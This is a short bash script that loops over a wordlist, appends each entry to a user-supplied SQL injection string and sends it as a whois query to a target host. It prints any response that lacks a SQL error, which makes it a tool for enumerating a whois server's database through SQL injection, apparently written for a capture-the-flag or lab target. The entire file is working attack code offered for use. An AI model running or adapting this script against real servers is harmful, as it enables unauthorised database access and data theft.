#!/bin/bash

NC='\033[0m' # No Color
BBLUE='\033[1;34m'
#IFS=

if [ $# -ne 2 ]
then
  echo "Usage $0 <SQLi> <wordlist>";
  exit;
fi
for db in $(cat $2); do
  OUTPUT="$(whois -h <ip> -H -p43 --verbose "$1$db #")"
  if [[ $OUTPUT != *"You have an error in your SQL"* ]] && [[ $OUTPUT != *"returned 0 object"* ]] && [[ $OUTPUT != *"whois: unrecognized option"* ]]
  then
      echo -e "$OUTPUT"
      printf "${BBLUE}===================================================${NC}\n\n"
  fi
done
